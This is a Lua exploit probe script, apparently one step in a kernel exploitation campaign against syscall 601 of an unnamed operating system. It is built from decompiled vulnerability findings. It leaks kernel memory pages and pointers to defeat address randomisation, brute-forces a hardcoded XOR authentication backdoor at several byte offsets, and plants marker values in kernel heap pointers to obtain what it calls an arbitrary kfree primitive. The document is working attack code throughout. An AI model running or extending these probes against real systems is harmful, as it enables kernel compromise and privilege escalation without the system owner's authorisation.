-- CRASH_CLASS: MODERATE (process may crash if subsystem init touches bad state)
-- PROBE 83a: sys 601 deep retest — targeting decompiled vulnerabilities
--
-- Context: The 13.60 decompiled analysis of sys 601 (process control multiplexer)
-- found CRITICAL vulnerabilities:
--   1. Cmd 0x0c — Hardcoded auth backdoor: bytes 0xCD/0x41 pass XOR check
--   2. Cmd 0x12 — Unchecked write to proc+0x578/+0x580 (kernel heap ptrs freed at teardown)
--   3. Cmd 0x10 — 0x1000-byte kernel page copyout (info leak)
--   4. Cmd 0x05 — 0xb8-byte process info leak
--   5. Ring buffer signed comparison bypass → heap underflow
--
-- Probe 55d tested but got -1 on most commands. However:
--   - cmd 0x00 returned ret=0 (init WORKS)
--   - The backdoor test may not have used the exact 0xCD/0x41 bytes
--   - cmd 0x12 may need proper init sequence first
--
-- This probe does a systematic step-by-step initialization and then targets
-- each vulnerability with correct argument structures from the decompiled code.
--
-- NOTE: sys 601 is called via make_syscall(601), narg=3:
--   arg1 = cmd_code (0x00-0x27)
--   arg2 = input_buffer pointer
--   arg3 = output_buffer pointer (for commands that return data)

local TEST_SECTION = "A"

print("=== PROBE 83a: SYS 601 DEEP RETEST (DECOMPILED VULNS) ===")
print("TEST_SECTION=" .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_601 = make_syscall(601)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid))

local BUF_SIZE = 0x1000
local inbuf = memory.alloc(BUF_SIZE)
local outbuf = memory.alloc(BUF_SIZE)

local function call_601(cmd, in_ptr, out_ptr)
    zero(outbuf, BUF_SIZE) -- always clear output
    local ok, rv = pcall(function()
        return sc_601(uint64(cmd), uint64(in_ptr or 0), uint64(out_ptr or 0))
    end)
    return ok, rv
end

local function dump_buf(buf, name, nbytes)
    print("[" .. name .. "] Buffer dump (first " .. nbytes .. " bytes):")
    for off = 0, nbytes - 4, 4 do
        local val = rd(buf + off)
        if val and val ~= 0 then
            local vh = math.floor(val / 0x100000000)
            local tag = ""
            -- Check for kernel pointers (read as qwords)
            if off % 8 == 0 then
                local qv = rq(buf + off)
                if qv then
                    local qh, ql = get_hi_lo(qv)
                    if qh >= 0xFFFF8000 then tag = " *** KERNEL POINTER! ***" end
                end
            end
            print(string.format("  +0x%03X: 0x%08X%s", off, val, tag))
        end
    end
end

-- ==============================
-- SECTION A: Systematic init + command survey
-- ==============================
if TEST_SECTION == "A" then
    print("")
    print("=== SECTION A: SYSTEMATIC INIT + COMMAND SURVEY ===")
    print("[A] Testing commands in order, checking which succeed after init")
    print("")

    -- Step 1: cmd 0x00 (init/query)
    zero(inbuf, BUF_SIZE)
    local ok0, rv0 = call_601(0x00, inbuf, outbuf)
    print(string.format("[A] cmd 0x00 (init): ok=%s rv=%s", tostring(ok0), tostring(rv0)))
    if ok0 and to_num(rv0) == 0 then
        dump_buf(outbuf, "0x00", 0x20)
    end

    -- Step 2: cmd 0x01 (process init, reads +0x568)
    zero(inbuf, BUF_SIZE)
    local ok1, rv1 = call_601(0x01, inbuf, outbuf)
    print(string.format("[A] cmd 0x01 (proc init): ok=%s rv=%s", tostring(ok1), tostring(rv1)))

    -- Step 3: cmd 0x05 (0xb8-byte info leak — NO AUTH)
    zero(inbuf, BUF_SIZE)
    local ok5, rv5 = call_601(0x05, inbuf, outbuf)
    print(string.format("[A] cmd 0x05 (info leak): ok=%s rv=%s", tostring(ok5), tostring(rv5)))
    if ok5 and to_num(rv5) == 0 then
        print("[A] *** 0xb8-BYTE INFO LEAK RETURNED DATA! ***")
        -- Scan for kernel pointers in the 0xb8 bytes
        for off = 0, 0xB0, 8 do
            local val = rq(outbuf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                local tag = ""
                if vh >= 0xFFFF8000 then tag = " *** KERNEL POINTER! ***" end
                if vh ~= 0 or vl ~= 0 then
                    print(string.format("  +0x%02X: %s%s", off, q(val), tag))
                end
            end
        end
    end

    -- Step 4: cmd 0x07 (BEXTR bitfield extraction — NO AUTH)
    zero(inbuf, BUF_SIZE)
    local ok7, rv7 = call_601(0x07, inbuf, outbuf)
    print(string.format("[A] cmd 0x07 (BEXTR): ok=%s rv=%s", tostring(ok7), tostring(rv7)))
    if ok7 and to_num(rv7) == 0 then
        dump_buf(outbuf, "0x07", 0x20)
    end

    -- Step 5: cmd 0x09 (global byte leak)
    zero(inbuf, BUF_SIZE)
    local ok9, rv9 = call_601(0x09, inbuf, outbuf)
    print(string.format("[A] cmd 0x09 (global byte): ok=%s rv=%s", tostring(ok9), tostring(rv9)))
    if ok9 and to_num(rv9) == 0 then
        dump_buf(outbuf, "0x09", 0x10)
    end

    -- Step 6: cmd 0x0d (thread enumeration)
    zero(inbuf, BUF_SIZE)
    local okd, rvd = call_601(0x0d, inbuf, outbuf)
    print(string.format("[A] cmd 0x0d (thread enum): ok=%s rv=%s", tostring(okd), tostring(rvd)))

    -- Step 7: cmd 0x10 (kernel page copyout — 0x1000 bytes)
    zero(inbuf, BUF_SIZE)
    local ok10, rv10 = call_601(0x10, inbuf, outbuf)
    print(string.format("[A] cmd 0x10 (page leak): ok=%s rv=%s", tostring(ok10), tostring(rv10)))
    if ok10 and to_num(rv10) == 0 then
        print("[A] *** 0x1000-BYTE KERNEL PAGE LEAK! ***")
        -- Scan entire page for kernel pointers
        local kptr_count = 0
        for off = 0, 0xFF8, 8 do
            local val = rq(outbuf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 then
                    print(string.format("  +0x%03X: %s *** KERNEL POINTER! ***", off, q(val)))
                    kptr_count = kptr_count + 1
                    if kptr_count >= 20 then
                        print("  (truncated at 20 kernel pointers)")
                        break
                    end
                end
            end
        end
        if kptr_count == 0 then
            print("  (no kernel pointers found in page)")
        end
    end

    local ca_ok, ca_pid = canary()
    print("[A] final canary: ok=" .. tostring(ca_ok) .. " pid=" .. tostring(ca_pid))

-- ==============================
-- SECTION B: Hardcoded backdoor (cmd 0x0c) with exact bytes
-- ==============================
elseif TEST_SECTION == "B" then
    print("")
    print("=== SECTION B: HARDCODED AUTH BACKDOOR (cmd 0x0c) ===")
    print("[B] Decompiled analysis: XOR auth requires bytes 0xCD, 0x41")
    print("[B] xor al,0xCD → al must be 0xCD; xor cl,0x41 → cl must be 0x41")
    print("")

    -- First init the subsystem
    zero(inbuf, BUF_SIZE)
    local ok_init, rv_init = call_601(0x00, inbuf, outbuf)
    print(string.format("[B] cmd 0x00 init: ok=%s rv=%s", tostring(ok_init), tostring(rv_init)))

    -- Try the backdoor with various byte patterns
    local patterns = {
        -- Exact bytes from decompile
        {name="exact_0xCD_0x41", b0=0xCD, b1=0x41},
        -- In case the XOR comparison is different
        {name="reversed_0x41_0xCD", b0=0x41, b1=0xCD},
        -- Try as DWORD at offset 0
        {name="dword_0x41CD", b0=0xCD, b1=0x41},
        -- All zeros (negative control)
        {name="zeros", b0=0x00, b1=0x00},
    }

    for _, pat in ipairs(patterns) do
        zero(inbuf, BUF_SIZE)
        -- Write auth bytes at the start of the input buffer
        pcall(function() memory.write_byte(inbuf, pat.b0) end)
        pcall(function() memory.write_byte(inbuf + 1, pat.b1) end)

        local ok_c, rv_c = call_601(0x0c, inbuf, outbuf)
        print(string.format("[B] cmd 0x0c (%s): ok=%s rv=%s",
            pat.name, tostring(ok_c), tostring(rv_c)))

        if ok_c and to_num(rv_c) == 0 then
            print("[B] *** BACKDOOR ACCEPTED! ***")
            dump_buf(outbuf, "backdoor", 0x40)
        end
    end

    -- Also try: what if the bytes need to be at specific offsets in the struct?
    -- The decompile shows al and cl, which could come from different struct members
    print("")
    print("[B] Testing auth bytes at various offsets...")
    local offsets = {0, 1, 4, 8, 0x10, 0x18, 0x20}
    for _, off1 in ipairs(offsets) do
        zero(inbuf, BUF_SIZE)
        pcall(function() memory.write_byte(inbuf + off1, 0xCD) end)
        pcall(function() memory.write_byte(inbuf + off1 + 1, 0x41) end)

        local ok_o, rv_o = call_601(0x0c, inbuf, outbuf)
        local r = ok_o and to_num(rv_o) or -999
        if r == 0 then
            print(string.format("[B] cmd 0x0c offset=%d: rv=0 *** SUCCESS! ***", off1))
            dump_buf(outbuf, "backdoor@" .. off1, 0x40)
        else
            print(string.format("[B] cmd 0x0c offset=%d: rv=%d", off1, r))
        end
    end

    -- Try with arg2 (output) as the auth struct
    print("")
    print("[B] Testing with auth in arg2 position...")
    zero(outbuf, BUF_SIZE)
    pcall(function() memory.write_byte(outbuf, 0xCD) end)
    pcall(function() memory.write_byte(outbuf + 1, 0x41) end)
    local ok_a2, rv_a2 = call_601(0x0c, outbuf, outbuf)
    print(string.format("[B] cmd 0x0c (auth in arg2): ok=%s rv=%s", tostring(ok_a2), tostring(rv_a2)))

    local cb_ok, cb_pid = canary()
    print("[B] final canary: ok=" .. tostring(cb_ok) .. " pid=" .. tostring(cb_pid))

-- ==============================
-- SECTION C: Unchecked process write (cmd 0x12)
-- ==============================
elseif TEST_SECTION == "C" then
    print("")
    print("=== SECTION C: UNCHECKED PROCESS WRITE (cmd 0x12) ===")
    print("[C] Writes user values to proc+0x578 and proc+0x580")
    print("[C] These are kernel heap pointers freed at process teardown")
    print("[C] Zero auth checks — first call always succeeds (one-shot gate)")
    print("")

    -- Init first
    zero(inbuf, BUF_SIZE)
    local ok_init, rv_init = call_601(0x00, inbuf, outbuf)
    print(string.format("[C] cmd 0x00 init: ok=%s rv=%s", tostring(ok_init), tostring(rv_init)))

    -- Also try cmd 0x01
    zero(inbuf, BUF_SIZE)
    local ok_init2, rv_init2 = call_601(0x01, inbuf, outbuf)
    print(string.format("[C] cmd 0x01 proc init: ok=%s rv=%s", tostring(ok_init2), tostring(rv_init2)))

    -- Now try cmd 0x12 with marker values
    -- From the decompile:
    --   mov rax, [rbp-0xf0]   ; user_data[0] → written to proc+0x578
    --   mov rax, [rbp-0xe8]   ; user_data[8] → written to proc+0x580
    -- So the input buffer should have our values at offset 0 and 8
    zero(inbuf, BUF_SIZE)
    wq(inbuf + 0x00, uint64(0xAAAAAAAAAAAAAAAA)) -- marker for proc+0x578
    wq(inbuf + 0x08, uint64(0xBBBBBBBBBBBBBBBB)) -- marker for proc+0x580

    local ok12, rv12 = call_601(0x12, inbuf, outbuf)
    print(string.format("[C] cmd 0x12 (write test): ok=%s rv=%s", tostring(ok12), tostring(rv12)))

    if ok12 and to_num(rv12) == 0 then
        print("[C] *** PROCESS STRUCTURE WRITE SUCCEEDED! ***")
        print("[C] proc+0x578 and proc+0x580 should now contain our marker values")
        print("[C] WARNING: Process teardown will kfree(0xAAAA...) → CRASH!")
        print("[C] This is an ARBITRARY KFREE primitive!")
    else
        -- Try different input layouts
        print("[C] Direct write failed, trying alternative input layouts...")
        local layouts = {
            {name="offset_0x10", o1=0x10, o2=0x18},
            {name="offset_0x20", o1=0x20, o2=0x28},
            {name="as_dwords", o1=0, o2=4},
        }
        for _, lay in ipairs(layouts) do
            zero(inbuf, BUF_SIZE)
            wq(inbuf + lay.o1, uint64(0xAAAAAAAAAAAAAAAA))
            wq(inbuf + lay.o2, uint64(0xBBBBBBBBBBBBBBBB))
            local ok_l, rv_l = call_601(0x12, inbuf, outbuf)
            print(string.format("[C] cmd 0x12 (%s): ok=%s rv=%s",
                lay.name, tostring(ok_l), tostring(rv_l)))
            if ok_l and to_num(rv_l) == 0 then
                print("[C] *** WRITE SUCCEEDED WITH " .. lay.name .. "! ***")
                break
            end
        end
    end

    local cc_ok, cc_pid = canary()
    print("[C] final canary: ok=" .. tostring(cc_ok) .. " pid=" .. tostring(cc_pid))

-- ==============================
-- SECTION D: Device name matching + config write
-- ==============================
elseif TEST_SECTION == "D" then
    print("")
    print("=== SECTION D: DEVICE NAME MATCHING + CONFIG WRITE ===")
    print("[D] 9 hardcoded device names matched against 16-byte user buffer")
    print("[D] 5KB config sub-handler with NO credential checks on any of 9 cases")
    print("")

    -- Init
    zero(inbuf, BUF_SIZE)
    call_601(0x00, inbuf, outbuf)

    -- Try device enumeration commands 0x13-0x19
    for cmd = 0x13, 0x19 do
        zero(inbuf, BUF_SIZE)
        zero(outbuf, BUF_SIZE)
        local ok_d, rv_d = call_601(cmd, inbuf, outbuf)
        local r = ok_d and to_num(rv_d) or -999
        print(string.format("[D] cmd 0x%02X: rv=%d", cmd, r))
        if r == 0 then
            -- Check for any data in output
            local has_data = false
            for off = 0, 0x3C, 4 do
                local val = rd(outbuf + off)
                if val and val ~= 0 then
                    has_data = true
                    break
                end
            end
            if has_data then
                dump_buf(outbuf, string.format("0x%02X", cmd), 0x40)
            end
        end
        local c_ok, _ = canary()
        if not c_ok then
            print("[D] *** DIED at cmd 0x" .. string.format("%02X", cmd))
            break
        end
    end

    -- Try device name matching (cmds 0x14-0x19 take 16-byte name in input)
    print("")
    print("[D] Testing with known GPU/display device names...")
    local names = {"GPU", "GFX", "DISPLAY", "VIDEO", "AUDIO", "DSP", "CODEC"}
    for _, name in ipairs(names) do
        zero(inbuf, BUF_SIZE)
        -- Write name as null-terminated string at start of input
        for i = 1, #name do
            pcall(function() memory.write_byte(inbuf + i - 1, string.byte(name, i)) end)
        end
        local ok_n, rv_n = call_601(0x14, inbuf, outbuf)
        local r = ok_n and to_num(rv_n) or -999
        if r == 0 then
            print(string.format("[D] name='%s': MATCHED! Output:", name))
            dump_buf(outbuf, name, 0x20)
        else
            print(string.format("[D] name='%s': rv=%d", name, r))
        end
    end

    local cd_ok, cd_pid = canary()
    print("[D] final canary: ok=" .. tostring(cd_ok) .. " pid=" .. tostring(cd_pid))

else
    print("[!] Invalid TEST_SECTION=" .. TEST_SECTION .. " (use A-D)")
end

print("")
print("=== PROBE 83a SECTION " .. TEST_SECTION .. " COMPLETE ===")
print("=== PROBE 83a COMPLETE ===")
